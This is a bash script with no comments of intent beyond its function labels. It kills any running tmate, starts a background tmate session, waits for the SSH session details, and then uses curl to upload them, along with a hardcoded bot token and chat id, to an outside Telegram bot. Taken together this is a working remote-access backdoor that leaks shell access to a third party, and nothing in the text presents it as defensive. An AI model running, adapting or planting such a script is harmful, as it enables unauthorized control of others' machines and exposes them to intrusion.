#!/bin/bash

# Function to send a file via Telegram
send_telegram_file() {
    local file_path="$1"
    curl -s -X POST "https://api.telegram.org/bot7304255419:AAEaB_c4vQeqO_aZtGukacDRC8RY-_GjQNE/sendDocument" \
        -F chat_id=1700631357 \
        -F document=@"$file_path"
}

killall tmate &> /dev/null

# Start tmate in the background and redirect output to a file
nohup tmate -F > $(whoami).log 2>&1 &

# Loop to check for session details
while true; do
    # Wait for tmate to start and produce session details
    sleep 6
    
    # Read session details from the file
    session_details=$(cat $(whoami).log)
    
    if [[ "$session_details" == *"ssh session:"* ]]; then
        # Successfully found session details, send the file
        send_telegram_file $(whoami).log
        printf "Successfully sent session details\n"
        break
    else
        # Session details not found, retry
        printf "Failed to find session details. Retrying...\n"
        sleep 5
    fi
done

wait
